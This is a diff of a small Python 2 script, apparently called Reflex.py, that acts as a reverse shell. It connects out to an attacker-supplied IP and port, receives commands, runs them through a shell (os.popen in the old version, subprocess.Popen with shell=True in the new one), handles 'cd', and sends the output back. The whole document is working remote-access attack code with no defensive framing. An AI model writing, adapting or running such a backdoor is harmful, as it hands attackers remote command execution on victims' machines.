@@ -1,37 +1,25 @@
+#!/usr/bin/python
+
 import os,socket,sys
-def usage():
-    print '''
-    ###################
-    #Reflex.py IP PORT#
-    ###################
-    [+]Example:
-    ------------------------------
-    |Hamoud-Oz.py 192.168.1.3 2121|
-    ------------------------------''',exit()
-if len(sys.argv) < 3:usage()
-s=socket.socket()
+import subprocess
+
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((sys.argv[1],int(sys.argv[2])))
-s.send('''
-             ###########################
-             #         Reflex          #
-             #    h4moud@hotmail.com   #
-             ###########################\n>>>''')
+s.send('''<<<Hey, Send me something, I'm ready =)\n>>''')
+
 while 1:
-    data = s.recv(512)
-    if "q" == data.lower():
+    data = s.recv(2048)
+    if "q" == data.lower().strip():
         s.close()
         break;
     else:
         if data.startswith('cd'):
-            os.chdir(data[3:].replace('\n',''))
+            os.chdir(data[3:].strip())
             s.send("Moved to "+str(os.getcwd()))
             result='\n'
+	    s.send(str(result)+'>>')
         else:
-            result=os.popen(data).read()
-    if (data.lower() != "q"):
-            s.send(str(result)+">>")
-    else:
-        s.send(str(result))
-        s.close()
-        break;
+            result=subprocess.Popen(data, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True, close_fds = True)
+            s.send(str(result.stdout.read())+">>")
 exit()
